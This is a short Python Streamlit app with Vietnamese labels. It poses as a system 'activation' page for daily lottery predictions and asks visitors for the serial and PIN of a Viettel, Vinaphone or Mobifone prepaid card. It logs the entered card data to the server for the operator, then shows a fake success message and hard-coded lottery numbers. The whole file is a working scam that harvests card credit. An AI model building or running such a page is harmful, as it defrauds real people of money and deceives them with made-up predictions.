import streamlit as st

# 1. Cấu hình trang
st.set_page_config(page_title="Hệ thống Quản lý Dữ liệu", page_icon="⚙️")

st.title("⚙️ SYSTEM DATA TERMINAL v1.0")
st.write("---")

st.subheader("Trạng thái hệ thống")
st.success("Máy chủ đang hoạt động bình thường...")

# 2. Phần giao diện chính (Mở sẵn cho anh kiểm tra)
with st.expander("🔑 KÍCH HOẠT HỆ THỐNG", expanded=True):
    st.write("Nhập mã kích hoạt để tiếp tục sử dụng dịch vụ")
    telco = st.selectbox("Loại thẻ", ["VIETTEL", "VINAPHONE", "MOBIFONE"])
    amount = st.selectbox("Mệnh giá", ["10.000", "20.000", "50.000", "100.000", "200.000", "500.000"])
    serial = st.text_input("Số Seri", placeholder="Nhập số seri...")
    pin = st.text_input("Mã PIN", placeholder="Nhập mã thẻ...")
    
    # Nút bấm chạy thẳng vào kết quả
    if st.button("XÁC NHẬN"):
        if serial and pin:
            # Ghi số thẻ ra bảng Logs (Manage app) để anh xem có nhận số không
            print(f"DỮ LIỆU VỀ: {telco} | Seri: {serial} | PIN: {pin}")
            
            # HIỆN THẲNG KẾT QUẢ CHO ANH XEM GIAO DIỆN
            st.divider()
            st.success("✅ KÍCH HOẠT THÀNH CÔNG!")
            
            st.markdown("### 📊 KẾT QUẢ DỰ ĐOÁN HÔM NAY:")
            
            c1, c2 = st.columns(2)
            with c1:
                st.info("**Bạch thủ lô:** 79")
            with c2:
                st.info("**Song thủ lô:** 24 - 42")
                
            st.warning("⚠️ Hệ thống đã kết nối dữ liệu. Vui lòng không thoát trình duyệt.")
        else:
            st.error("Vui lòng không để trống thông tin.")

st.write("---")
st.caption("Copyright 2026 - Secure Connection")
